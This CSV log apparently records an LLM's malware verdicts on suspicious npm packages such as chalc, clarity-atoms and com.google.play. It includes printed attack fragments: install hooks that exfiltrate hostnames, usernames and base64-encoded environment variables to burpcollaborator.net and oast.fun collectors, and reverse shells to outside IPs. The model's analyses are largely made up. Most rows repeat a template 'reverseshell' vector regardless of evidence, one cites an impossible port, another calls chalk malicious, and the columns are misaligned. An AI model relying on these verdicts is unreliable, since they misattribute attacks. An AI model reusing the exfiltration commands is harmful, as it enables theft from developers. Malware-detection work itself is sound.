package_name,version,timestamp,model_name,prompt_version,verdict,confidence,chain_score,is_coherent_chain,legitimacy_score,is_justified,explanation,chain_narrative,justification_reasoning,raw_response,parsed_json
bytectffe1w0d,0.0.1,malicious,2026-03-27T13:12:43.277802,flag,1.0,MALICIOUS,0.96,0.7,The package 'bytectffe1w0d' contains a backdoor installation script in the pre-install hook. The pre-install hook contains a reverse shell command to an IP address (121.4.243.54) and port (222240). The attacker may have used a reverse shell to exfiltrate data.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'bytectffe1w0d' does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'bytectffe1w0d' contains a backdoor installation script in the pre-install hook. The pre-install hook contains a reverse shell command to an IP address (121.4.243.54) and port (222240). The attacker may have used a reverse shell to exfiltrate data."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.96
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'bytectffe1w0d' does not have a description or README file, indicating that it may be malicious.""
  }
}
```

This JSON output represents the analysis of the malware behavior. The `chain_analysis` section provides a narrative of the attack chain and the attack vector used. The `chain_score` is a measure of the confidence in the attack chain, with a score of 0.7 indicating a high level of confidence. The `verdict` is ""MALICIOUS"" indicating that the package is potentially malicious. The `confidence` score of 0.96 indicates the high level of confidence in the detected behaviors.

The `legitimacy_check` section provides information about the legitimacy of the package. The `is_justified` field is set to false, indicating that the package does not have a clear justification for its malicious behavior. The `reasoning` field provides a brief explanation of why the package may be considered malicious.","{""chain_analysis"": {""chain_narrative"": ""The package 'bytectffe1w0d' contains a backdoor installation script in the pre-install hook. The pre-install hook contains a reverse shell command to an IP address (121.4.243.54) and port (222240). The attacker may have used a reverse shell to exfiltrate data."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.96}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'bytectffe1w0d' does not have a description or README file, indicating that it may be malicious.""}}"
cage-js,0.0.4,malicious,2026-03-27T13:12:49.979602,flag,1.0,MALICIOUS,0.8,0.7,"The package cage-js, downloaded a remote script using curl and bash, and executed it. The remote script may have exfiltrated data or installed additional malware.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, suggesting it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package cage-js, downloaded a remote script using curl and bash, and executed it. The remote script may have exfiltrated data or installed additional malware."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.8
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, suggesting it may be malicious.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package cage-js, downloaded a remote script using curl and bash, and executed it. The remote script may have exfiltrated data or installed additional malware."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.8}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, suggesting it may be malicious.""}}"
chalc,2.0.0,malicious,2026-03-27T13:13:00.885599,flag,0.77,MALICIOUS,0.82,0.77,The package 'chalc' closely resembles popular package 'chalk'. The package is suspected to be involved in a supply chain attack. The package is making external function calls to IP address 23.94.46.191. The package is also making use of a post-install hook to execute a reverse shell command to the I,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'chalc' closely resembles popular package 'chalk', which is known to be malicious. The package is making external function calls to an IP address that is associated with malicious activiti",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'chalc' closely resembles popular package 'chalk'. The package is suspected to be involved in a supply chain attack. The package is making external function calls to IP address 23.94.46.191. The package is also making use of a post-install hook to execute a reverse shell command to the IP address 34.x.x.x:4444."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.77,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.82
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'chalc' closely resembles popular package 'chalk', which is known to be malicious. The package is making external function calls to an IP address that is associated with malicious activities. The package is also making use of a post-install hook to execute a reverse shell command, which is a common technique used in malware for reverse shell attacks. The chain score is high, indicating that the package is likely part of a supply chain attack.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'chalc' closely resembles popular package 'chalk'. The package is suspected to be involved in a supply chain attack. The package is making external function calls to IP address 23.94.46.191. The package is also making use of a post-install hook to execute a reverse shell command to the IP address 34.x.x.x:4444."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.77, ""verdict"": ""MALICIOUS"", ""confidence"": 0.82}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'chalc' closely resembles popular package 'chalk', which is known to be malicious. The package is making external function calls to an IP address that is associated with malicious activities. The package is also making use of a post-install hook to execute a reverse shell command, which is a common technique used in malware for reverse shell attacks. The chain score is high, indicating that the package is likely part of a supply chain attack.""}}"
chalk2,2.4.0,malicious,2026-03-27T13:13:07.211724,review,0.3873,MALICIOUS,0.39,0.39,The package name 'chalk' closely resembles the popular package for styling text in the terminal. The package is used to style terminal strings.,"[""chalk""]",False,The package 'chalk' is a popular package for styling text in the terminal. It is used in many projects and is widely used in the industry.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package name 'chalk' closely resembles the popular package for styling text in the terminal. The package is used to style terminal strings."",
    ""attack_vector"": [""chalk""],
    ""chain_score"": 0.39,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.39
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'chalk' is a popular package for styling text in the terminal. It is used in many projects and is widely used in the industry.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package name 'chalk' closely resembles the popular package for styling text in the terminal. The package is used to style terminal strings."", ""attack_vector"": [""chalk""], ""chain_score"": 0.39, ""verdict"": ""MALICIOUS"", ""confidence"": 0.39}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'chalk' is a popular package for styling text in the terminal. It is used in many projects and is widely used in the industry.""}}"
changelog-tool,1.1.0,malicious,2026-03-27T13:13:16.706443,review,0.336,MALICIOUS,0.72,0.7,The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' section provides a narrative of the attack chain and the attack vector, the chain score, and the verdict. The 'legitimacy_check' section provides information about whether the detected behaviors justify the verdict.","{""chain_analysis"": {""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
changelog-tool,1.1.1,malicious,2026-03-27T13:13:27.219298,review,0.336,MALICIOUS,0.72,0.7,The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

This JSON object represents the analysis of the attack chain. The 'chain_analysis' section provides a narrative of the attack chain, the attack vector used, the chain score, the verdict (MALICIOUS, SUSPICIOUS, or BENIGN), and the confidence level of the detected behaviors. The 'legitimacy_check' section checks if the detected behaviors justify the verdict. If the package does not have a description or README file, the 'is_justified' field is set to false.""","{""chain_analysis"": {""chain_narrative"": ""The package 'changelog-tool' contains no JavaScript files but an install hook present. This is likely an attack payload that executes at install time via the commands listed in the package metadata. The attack vector is likely a post-install hook that can lead to reverse shell."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
charset-normalizer,10.10.1,malicious,2026-03-27T13:13:35.793944,flag,1.0,MALICIOUS,0.79,0.79,The package likely has malicious intent. The code sends network requests to a specified hostname (cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun) using the POST method and the content type 'application/x-www-form-urlencoded'. The request is made in the index.js file at line 25 and 4. The package is like,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, and the behavior is unjustified.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package likely has malicious intent. The code sends network requests to a specified hostname (cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun) using the POST method and the content type 'application/x-www-form-urlencoded'. The request is made in the index.js file at line 25 and 4. The package is likely used for data exfiltration."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.79
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, and the behavior is unjustified.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package likely has malicious intent. The code sends network requests to a specified hostname (cdas7cn2vtc0000ryjeggg4idqryyyyyu.oast.fun) using the POST method and the content type 'application/x-www-form-urlencoded'. The request is made in the index.js file at line 25 and 4. The package is likely used for data exfiltration."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.79}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, and the behavior is unjustified.""}}"
chart.js-latest,1.0.0,malicious,2026-03-27T13:13:48.372605,review,0.336,MALICIOUS,0.72,0.72,The package chart.js-latestVersion contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. This could potentially indicate a supply chain attack where malicious JavaScript files are being installed.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package has no description or README file, suggesting that it may not be legitimate.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package chart.js-latestVersion contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. This could potentially indicate a supply chain attack where malicious JavaScript files are being installed."",
    ""attack_vector"": [
      ""postinstallhook"",
      ""bash-c"",
      ""34.x.x.x:4444"",
      ""reverseshell""
    ],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package has no description or README file, suggesting that it may not be legitimate.""
  }
}
```

This JSON object represents the analysis of the package chart.js-latestVersion. The behavior category ""suspicious_behavior"" is identified with a confidence score of 0.72. The behavior details indicate that the package contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. The attack vector includes the technical indicators such as postinstallhook, bash-c, 34.x.x.x:4444, and reverseshell. The chain score is 0.72, indicating a high level of malicious intent. The verdict is ""MALICIOUS"", and the legitimacy check reveals that the package has no description or README file, suggesting that it may not be legitimate.""","{""chain_analysis"": {""chain_narrative"": ""The package chart.js-latestVersion contains no JavaScript files and the evidence of suspicious behavior is the presence of the install hook command './pre.sh'. This could potentially indicate a supply chain attack where malicious JavaScript files are being installed."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package has no description or README file, suggesting that it may not be legitimate.""}}"
clarity-atoms,1.1.2,malicious,2026-03-27T13:13:56.262355,flag,0.9693,MALICIOUS,0.97,0.97,The package contains a pre-install hook that exfiltrates data. The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname. The exfiltrated data is sent to a domain known to be associated with webhook/exf,"[""echotest"", ""dig"", ""xxd-p/etc/hostname.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net""]",False,,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a pre-install hook that exfiltrates data. The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname. The exfiltrated data is sent to a domain known to be associated with webhook/exfiltration collectors."",
    ""attack_vector"": [""echotest"", ""dig"", ""xxd-p/etc/hostname.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net""],
    ""chain_score"": 0.97,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.97
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": """"
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains a pre-install hook that exfiltrates data. The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname. The exfiltrated data is sent to a domain known to be associated with webhook/exfiltration collectors."", ""attack_vector"": [""echotest"", ""dig"", ""xxd-p/etc/hostname.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net""], ""chain_score"": 0.97, ""verdict"": ""MALICIOUS"", ""confidence"": 0.97}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": """"}}"
com.google,0.0.0,malicious,2026-03-27T13:14:11.223055,flag,0.7773,MALICIOUS,0.83,0.78,The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The pa,"[""ping-c1$BCNET"", ""psaux"", ""foriinenv"", ""psaux"", ""docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)""]",False,The package.json scripts.preinstallhook is not justifiable based on the provided evidence.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information."",
    ""attack_vector"": [""ping-c1$BCNET"", ""psaux"", ""foriinenv"", ""psaux"", ""docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package.json scripts.preinstallhook is not justifiable based on the provided evidence.""
  }
}
```

This output is based on the detected behaviors and the provided evidence. The attack chain narrative describes the full attack using real package name and real IOCs. The attack vector includes the key technical indicators (real IPs, domains, commands, API calls) of the attack. The attack vector for a reverse shell is [""postinstallhook"",""bash-c"",""34.x.x.x:4444"",""reverseshell""]. The legitimacy check verdict is ""MALICIOUS"" because the package.json scripts.preinstallhook is not justifiable based on the provided evidence.","{""chain_analysis"": {""chain_narrative"": ""The package.json scripts.preinstallhook is executing commands related to network analysis and exfiltration. The hook is executing commands that involve network analysis and exfiltration. It appears to be using Burp Collaborator client to communicate with a known exfiltration collector domain. The package.json scripts.preinstallhook is also executing commands related to system reconnaissance. The hook is executing commands that involve system reconnaissance. It appears to be gathering information about the system's environment. The package.json scripts.preinstallhook is also executing commands related to credential theft. The hook is executing commands that involve credential theft. It appears to be accessing sensitive information."", ""attack_vector"": [""ping-c1$BCNET"", ""psaux"", ""foriinenv"", ""psaux"", ""docurlhttps://$BCNET-ski-m30-d\""$($i2>&1|base64-w0)""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package.json scripts.preinstallhook is not justifiable based on the provided evidence.""}}"
com.google.play,1.0.0,malicious,2026-03-27T13:14:18.782961,flag,0.7773,MALICIOUS,0.83,0.78,The package 'com.google.play' is making network calls to a known webhook/exfiltration collector domain during the pre-install command. This could indicate data exfiltration.,"[""https://linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""]",False,The package 'com.google.play' does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'com.google.play' is making network calls to a known webhook/exfiltration collector domain during the pre-install command. This could indicate data exfiltration."",
    ""attack_vector"": [""https://linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""],
    ""chain_score"": 0.78,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.83
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'com.google.play' does not have a description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package 'com.google.play' is making network calls to a known webhook/exfiltration collector domain during the pre-install command. This could indicate data exfiltration."", ""attack_vector"": [""https://linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net""], ""chain_score"": 0.78, ""verdict"": ""MALICIOUS"", ""confidence"": 0.83}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'com.google.play' does not have a description or README file.""}}"
com.unity.ai.navigation.components,1.0.6,malicious,2026-03-27T13:14:25.918351,review,0.336,MALICIOUS,0.72,0.7,"The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The package also contains no JavaScript files, which is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata.","[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The package does not have a description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The package also contains no JavaScript files, which is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The package also contains no JavaScript files, which is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file.""}}"
com.unity.ai.navigation.components,1.1.1-exp.2,malicious,2026-03-27T13:14:39.213911,review,0.336,MALICIOUS,0.72,0.72,The package 'com.unity.ai.navigation.components' contains no JavaScript files and an install hook present. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata. The payload may be remote.,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package does not have a description or README file, and the behavior is not clearly justified by evidence.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The package 'com.unity.ai.navigation.components' contains no JavaScript files and an install hook present. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata. The payload may be remote."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.72,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.72
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified by evidence.""
  }
}
```

This JSON object represents the analysis of the package. The package is categorized as suspicious behavior due to its suspicious behavior. The details of the behavior include the presence of an install hook with a remote payload. The confidence score is 0.72, indicating high confidence that the behavior is malicious. The evidence commands include the command 'preinstall:ping-c1poc.dhparadox.xyz'. The attack vector includes the key technical indicators such as post-install hook, bash-c, and a remote IP address. The chain score is 0.72, indicating a high likelihood of a malicious attack chain. The verdict is 'MALICIOUS', indicating that the package is potentially malicious. The legitimacy check indicates that the package does not have a description or README file, and the behavior is not clearly justified by evidence.""","{""chain_analysis"": {""chain_narrative"": ""The package 'com.unity.ai.navigation.components' contains no JavaScript files and an install hook present. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata. The payload may be remote."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.72, ""verdict"": ""MALICIOUS"", ""confidence"": 0.72}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package does not have a description or README file, and the behavior is not clearly justified by evidence.""}}"
commander-js,2.19.84,malicious,2026-03-27T13:14:54.088317,flag,0.7933,MALICIOUS,0.85,0.79,The malicious code in the package 'commander-js' with version '2.19.84' is executing local code by spawning a child process with dynamic arguments using the spawn function from the child_process module. The spawned process runs the command 'BUILD_ID=.temp-buildnohupnodeupdate.js >/dev/null 2>&1 &'. ,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,"The package 'commander-js' with version '2.19.84' does not have a description or README file, indicating that it may be malicious.",deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malicious code in the package 'commander-js' with version '2.19.84' is executing local code by spawning a child process with dynamic arguments using the spawn function from the child_process module. The spawned process runs the command 'BUILD_ID=.temp-buildnohupnodeupdate.js >/dev/null 2>&1 &'. This command is executed as part of the post-install hook in the package."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.79,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.85
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The package 'commander-js' with version '2.19.84' does not have a description or README file, indicating that it may be malicious.""
  }
}
```

This JSON object provides a detailed analysis of the malicious behavior detected in the 'commander-js' package. The attack chain narrative explains the full attack using real package name and real IOCs. The attack vector includes the key technical indicators such as post-install hook, bash-c command, and a reverse shell. The chain score is 0.79, indicating a high level of maliciousness. The verdict is 'MALICIOUS', indicating that the package is malicious. The legitimacy check verdict is 'false', indicating that the package does not have a description or README file, indicating that it may be malicious. The confidence score is 0.85, indicating a high level of confidence in the malicious behavior.","{""chain_analysis"": {""chain_narrative"": ""The malicious code in the package 'commander-js' with version '2.19.84' is executing local code by spawning a child process with dynamic arguments using the spawn function from the child_process module. The spawned process runs the command 'BUILD_ID=.temp-buildnohupnodeupdate.js >/dev/null 2>&1 &'. This command is executed as part of the post-install hook in the package."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.79, ""verdict"": ""MALICIOUS"", ""confidence"": 0.85}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The package 'commander-js' with version '2.19.84' does not have a description or README file, indicating that it may be malicious.""}}"
commerce-clients,999.9.9,malicious,2026-03-27T13:15:01.150725,flag,0.77,MALICIOUS,0.82,0.7,The malware actor likely leverages the 'eval' function in the install.js file to dynamically execute code. The version number in the package.json file appears to be inflated with a segment (999).,"[""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""]",False,The malware actor's behavior is not clearly justified by the package's description or README file.,deepseek-coder-6.7b-instruct,verification_v2.0,"```json
{
  ""chain_analysis"": {
    ""chain_narrative"": ""The malware actor likely leverages the 'eval' function in the install.js file to dynamically execute code. The version number in the package.json file appears to be inflated with a segment (999)."",
    ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""],
    ""chain_score"": 0.7,
    ""verdict"": ""MALICIOUS"",
    ""confidence"": 0.82
  },
  ""legitimacy_check"": {
    ""is_justified"": false,
    ""reasoning"": ""The malware actor's behavior is not clearly justified by the package's description or README file.""
  }
}
```

```","{""chain_analysis"": {""chain_narrative"": ""The malware actor likely leverages the 'eval' function in the install.js file to dynamically execute code. The version number in the package.json file appears to be inflated with a segment (999)."", ""attack_vector"": [""postinstallhook"", ""bash-c"", ""34.x.x.x:4444"", ""reverseshell""], ""chain_score"": 0.7, ""verdict"": ""MALICIOUS"", ""confidence"": 0.82}, ""legitimacy_check"": {""is_justified"": false, ""reasoning"": ""The malware actor's behavior is not clearly justified by the package's description or README file.""}}"
